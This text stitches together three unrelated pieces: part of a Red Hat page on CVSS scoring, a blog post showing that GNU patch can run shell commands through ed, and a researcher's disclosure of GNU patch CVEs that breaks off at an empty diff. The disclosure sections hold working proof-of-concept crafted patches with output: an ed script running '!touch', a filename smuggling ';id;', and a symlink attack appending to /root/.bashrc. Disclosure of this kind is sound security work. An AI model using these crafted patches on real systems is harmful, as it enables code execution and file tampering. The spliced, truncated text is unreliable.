* A vulnerability that only affected some architectures. For example,
  [CVE-2019-15031](https://access.redhat.com/security/cve/CVE-2019-15031)
  only affected PowerPC.
* A vulnerability that is mitigated by source code protection
  mechanisms on some platforms. For example,
  [CVE-2018-1125](https://access.redhat.com/security/cve/CVE-2018-1125)
  could have led to arbitrary code execution on Red Hat Enterprise
  Linux, but it is only a denial of service because it was compiled
  with FORTIFY protections.
* A vulnerability that affected more than one product.  For example,
  [CVE-2020-14060](https://access.redhat.com/security/cve/CVE-2020-14060)
  affected a component in both OpenShift and OpenStack.  The severity
  to OpenStack was lower (Low) as compared to OpenShift (Moderate)
  based on its usage; the overall vulnerability itself was rated
  Important.

If CVSS v3 base scores are significantly different across products, we
note that separately wherever possible. If we do not split the score,
we report the metric that gives the highest CVSS v3 base score (the
worst-case outcome).

### Differences Between NVD and Red Hat Scores

For open source software shipped by multiple vendors, the CVSS base
scores may vary for each vendor's version, depending on the version
they ship, how they ship it, the platform, and even how the software
is compiled. This makes scoring vulnerabilities difficult for
third-party vulnerability databases, such as NVD, who can give only a
single CVSS base score to each vulnerability, or when comparing to
other vendors who score based on the characteristics of use in their
own products. See the
[National Vulnerability Database](https://nvd.nist.gov/vuln-metrics/cvss)
for more information regarding NVD security ratings.

These differences can cause the scores to vary widely. Other reasons
may include how the source code was compiled with certain compiler
flags or hardening technologies that reduce or eliminate the security
severity of a flaw, or how the software is used within the product.
Software running standalone may suffer from a flaw, but its use within
a product may preclude the vulnerable code from ever being used in a
way that could be exploited.

For example, NVD may rate a flaw in a particular service as having
High Impact on the CVSS CIA Triad (Confidentiality, Integrity,
Availability) where the service in question is typically run as the
root user with full privileges on a system. However, in a Red Hat
product, the service may be specifically configured to run as a
dedicated non-privileged user running entirely in a SELinux sandbox,
greatly reducing the immediate impact from compromise, resulting in
Low impact.

For these reasons, we recommend that, whenever possible, you use a
CVSS base score provided by Red Hat in preference to a score from a
third party. Please
[let us know](https://access.redhat.com/site/security/team/contact/)
if you believe we have given an incorrect CVSS v3 base score for a
particular vulnerability. We are happy to discuss and update if
needed.

## patch runs ed, and ed can run anything

Okay, this is kind of awesome, if you like watching the world burn.

The short version is: patch runs ed... and ed can run arbitrary
commands, including when it's called from patch.

Check this out. I've taken the proof of concept and changed it
slightly:

```

$ cat evil.patch
--- /dev/null   2018-13-37 13:37:37.000000000 +0100
+++ b/beep.c    2018-13-37 13:38:38.000000000 +0100
1337a
1,112d
!touch /tmp/0wned; ls -la /tmp/0wned
.
$ patch < evil.patch
?
?
-rw-r--r-- 1 edu users 0 Apr  5 10:42 /tmp/0wned
?
patch: **** /usr/bin/ed FAILED
$

```

This came up as part of the discussion on the "beep exploit" yesterday.
I found it buried in the HN /new queue as a simple
[link to the Debian bug tracker.](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=894667#19)

This seems far too good to leave hidden in there.

Subprocesses, am I right?

Late update: it looks like FreeBSD
[fixed this same sort of thing](https://www.freebsd.org/security/advisories/FreeBSD-SA-15%3A18.bsdpatch.asc)
in 2015. GNU patch, however (shown above), clearly has not.

Another update: OpenBSD also
[patched it](https://ftp.openbsd.org/pub/OpenBSD/patches/5.7/common/013_patch.patch.sig)
in 2015. It looks like they had it first, which I suppose makes sense.
Also, I'm hearing it can't exec other programs any more, which is pretty
awesome. That's the right way to close this kind of door.

# GNU patch vulnerabilities

I identified several vulnerabilities in the GNU patch utility, some of them making it possible to execute
arbitrary code if the victim opens a crafted patch file. It also turned out, some of these vulnerabilities
had been silently addressed by the maintainer back then in 2018 when CVE-2018-1000156 was reported by
pushing some additional commits the same day, but only the primary patch was picked up by many Linux
distributions (like Debian, Ubuntu or Fedora).

## The vulnerabilities

### CVE-2018-1000156 - unrestricted ed input

This finding belongs to someone else, but unfortunately I'm unsure who the author is.
The original thread on the official bug report site:

<https://savannah.gnu.org/bugs/?53566>

The official patch of CVE-2018-1000156 is:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=123eaff0d5d1aebe128295959435b9ca5909c26d>

According to the comment of the commit:

* src/pch.c (do\_ed\_script): Write ed script to a temporary file
  instead of piping it to ed: this will cause ed to abort on invalid
  commands instead of rejecting them and carrying on.

The thing is, `ed`'s behaviour is different when the script is coming
from a pipe (see the edoffset.script attached):

```
root@55c24e15f7e6:/data/edstyle5# touch whatever
root@55c24e15f7e6:/data/edstyle5# cat edoffset.script | ed whatever
0
?
!
0
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
uid=0(root) gid=0(root) groups=0(root)

```

And when it is duped:

```
root@55c24e15f7e6:/data/edstyle5#  rm id-proof.txt
root@55c24e15f7e6:/data/edstyle5#  ed whatever < edoffset.script
0
?
root@55c24e15f7e6:/data/edstyle5# cat id-proof.txt
cat: id-proof.txt: No such file or directory

```

And now the same via patch:

```
root@55c24e15f7e6:/data/edstyle5# ../patch-2.7.6-vanilla/patch-2.7.6/src/patch  < CVE-2018-1000156.patch
patching file file
?
foo
../patch-2.7.6-vanilla/patch-2.7.6/src/patch: **** /bin/ed FAILED
root@55c24e15f7e6:/data/edstyle5# cat CVE-2018-1000156-proof.txt
uid=0(root) gid=0(root) groups=0(root)

```

`CVE-2018-1000156.patch` here is pretty much the same as the original PoC created
for that issue (`poc.patch` among the attachments on savannah linked above).

### CVE-2019-13638 - Shell command injection while invoking ed

The GNU `patch` utility used to invoke `ed` via the shell interpreter and the filenames
were not sanitized correctly, making it vulnerable to shell command injection.
This way, exploitation of CVE-2019-13638 doesn't even require `ed` to be installed.

The official fix was commited the same day as for CVE-2018-1000156, but many distributions
didn't pick it up:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The proof of concept:

```
root@3ffaeb445eab:/data/edstyle4# patch --version
GNU patch 2.7.6
...

root@3ffaeb445eab:/data/edstyle4# patch < CVE-2019-13638.patch
patching file ';id;.txt'
sh: 1: ed: not found
uid=0(root) gid=0(root) groups=0(root)
sh: 1: .txt.o60SfgR: not found
patch: **** ed FAILED

```

### CVE-2019-13636 - Directory traversal and file append

The directory traversal here made it possible to escape the working directory of patch
and append (almost) arbitrary file content to any files on the file system.

This finding is brand new and was fixed only after I reported it. Official patch:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=dce4683cbbe107a95f1f0d45fabc304acfb5d71a>

When patch was saving a rejection, it did not check properly whether the file already
exists or not. This could be abused to escape the working dir:

```
root@3ffaeb445eab:/data/test1/test-apply3#  cat CVE-2019-13636.patch | patch
patching symbolic link home
patching symbolic link home.rej
File home is not a regular file -- refusing to patch
1 out of 1 hunk ignored -- saving rejects to file home.rej
patching symbolic link home
patching symbolic link home.rej

root@3ffaeb445eab:/data/test1/test-apply3# cat /root/.bashrc
# ~/.bashrc: executed by bash(1) for non-login shells.
...
# alias mv='mv -i'
--- home
+++ home
@@ -0,0 +1,3 @@
+ partially
+ controlled
+ content

```

### CVE-2018-20969 - OS shell command execution via ! prefixed ed filenames

If `ed` receives an exclaimation mark prefixed command line argument, it is executed
as a shell command via popen. This was exploitable via GNU `patch` as well.

Official fix:

<https://git.savannah.gnu.org/cgit/patch.git/commit/?id=3fcd042d26d70856e826a42b5f93dc4854d80bf0>

The referenced patch is the same as for CVE-2019-13638; note the assertion line.

(Yes, CVE-2018-20969 was reported by me in 2019 along with the other two and MITRE indeed
assigned a 2018 ID for it)

Since `ed` is capturing the output of what it executes and the same version of GNU `patch` was vulnerable
I decided to build 2 versions of `patch` with the above patch applied, one with the assertion line and
one without it.

```
root@a8e181dcb4b1:/data# diff /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-assert/src/pch.c /data/patch-3fcd042d26d70856e826a42b5f93dc4854d80bf0-noassert/src/pch.c
